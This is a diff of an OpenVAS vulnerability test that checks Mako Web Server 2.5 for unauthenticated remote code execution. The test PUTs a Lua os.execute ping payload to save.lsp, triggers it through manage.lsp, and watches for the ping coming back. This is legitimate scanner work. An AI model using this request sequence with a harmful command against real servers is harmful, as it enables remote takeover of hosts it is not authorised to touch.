@@ -1,8 +1,8 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mako_web_server_mult_vuln.nasl 8529 2018-01-25 08:59:00Z ckuersteiner $
+# $Id: gb_mako_web_server_mult_vuln.nasl 10322 2018-06-26 06:37:28Z cfischer $
 #
-# Mako Web Server Multiple Vulnerabilities 
+# Mako Web Server Multiple Vulnerabilities
 #
 # Authors:
 # Shakeel <bshakeel@secpod.com>
@@ -29,21 +29,30 @@ CPE = "cpe:/a:mako:mako_web_server";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811771");
-  script_version("$Revision: 8529 $");
+  script_version("$Revision: 10322 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-01-25 09:59:00 +0100 (Thu, 25 Jan 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-26 08:37:28 +0200 (Tue, 26 Jun 2018) $");
   script_tag(name:"creation_date", value:"2017-09-18 16:33:01 +0530 (Mon, 18 Sep 2017)");
-  script_tag(name:"qod_type", value:"exploit");
   script_name("Mako Web Server Multiple Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
+  script_family("Web application abuses");
+  script_dependencies("gb_mako_web_server_detect.nasl", "os_detection.nasl");
+  script_mandatory_keys("Mako/WebServer/installed");
+  script_require_ports("Services/www", 9357, 80, 443);
 
-  script_tag(name: "summary" , value:"The host is running Mako Web Server and
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/42683");
+  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3391");
+
+  script_tag(name:"summary", value:"The host is running Mako Web Server and
   is prone to multiple vulnerabilities.");
 
   script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
   whether we are able to execute arbitrary code on affected target or not.");
 
   script_tag(name:"insight", value:"Multiple flaws are due to,
+
   - Mako web-server tutorial does not sufficiently sanitize the HTTP PUT
     requests when a user sends an HTTP PUT request to 'save.lsp' web page,
     the input passed to a function responsible for accessing the filesystem.
@@ -66,22 +75,12 @@ if(description)
   script_tag(name:"affected", value:"Mako Web Server version 2.5. Other versions
   may also be affected.");
 
-  script_tag(name:"solution", value:"No solution or patch is available as of
-  25nd January, 2018. Information regarding this issue will be updated once
-  solution details are available. For updates refer to,
-  https://makoserver.net");
+  script_tag(name:"solution", value:"No known solution is available as of 04th June, 2018. Information regarding
+  this issue will be updated once solution details are available.");
 
   script_tag(name:"solution_type", value:"NoneAvailable");
+  script_tag(name:"qod_type", value:"exploit");
 
-  script_xref(name : "URL" , value : "www.exploit-db.com/exploits/42683");
-  script_xref(name : "URL" , value : "https://blogs.securiteam.com/index.php/archives/3391");
-
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
-  script_family("Web application abuses");
-  script_dependencies("gb_mako_web_server_detect.nasl", "os_detection.nasl");
-  script_mandatory_keys("Mako/WebServer/installed");
-  script_require_ports("Services/www", 9357, 80, 443);
   exit(0);
 }
 
@@ -90,75 +89,54 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-##Get Port
 if(!makoPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Open Socket
-soc = open_sock_tcp(makoPort);
-if(!soc){
-  exit(0);
-}
+host = http_host_name(port:makoPort);
 
-##Check platform
-if(host_runs("Windows") == "yes")
-{
-  ## Construct command to be executed on Windows
+if(host_runs("Windows") == "yes"){
   CMD = "os.execute('ping -n 5 " + this_host() + "')";
   win = TRUE;
-}
-else
-{
-  ##For Linux and Unix platform
+}else{
   check = "__OpenVAS__" + rand_str(length:4);
   pattern = hexstr(check);
-  ## Construct command to be executed on Linux/Unix
   CMD = "os.execute('ping -c 5 -p " + pattern + " " + this_host() + "')" ;
 }
 
-##Get Host Name
-host = http_host_name(port:makoPort);
-if(!host){
-  exit(0);
-}
-
-## POSTDATA Length
 len = strlen(CMD);
 if(!len){
   exit(0);
 }
 
-##Construct PUT Request
 url = "/examples/save.lsp?ex=openVASTest";
-
 req = string("PUT ", url, " HTTP/1.1\r\n",
           "Content-Length: ", len, "\r\n",
           "Host: ", host, "\r\n",
           "\r\n", CMD);
-
 res = http_keepalive_send_recv(port:makoPort, data:req);
-if(res =~ "204 No Content" && "Server: MakoServer.net" >< res)
-{
+if(res =~ "204 No Content" && "Server: MakoServer.net" >< res){
+
+  soc = open_sock_tcp(makoPort);
+  if(!soc){
+    exit(0);
+  }
+
   url = "/examples/manage.lsp?execute=true&ex=openVASTest&type=lua";
-  ##Construct Attack GET Request
+
   req = string("GET ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n\r\n");
 
-  ##Send GET Req and Get response
   res = send_capture( socket:soc,
                       data:req,
                       timeout:2,
                       pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
-
-  ##Confirm Response
-  if(res && (win || check >< res))
-  {
+  close(soc);
+  if(res && (win || check >< res)){
     report = "It was possible to execute command remotely at " + report_vuln_url( port:makoPort, url:url, url_only:TRUE ) + " with the command '" + CMD + "'.";
     security_message( port:makoPort, data:report);
-    close(soc);
     exit(0);
   }
 }
-close(soc);
-exit(0);
+
+exit(99);
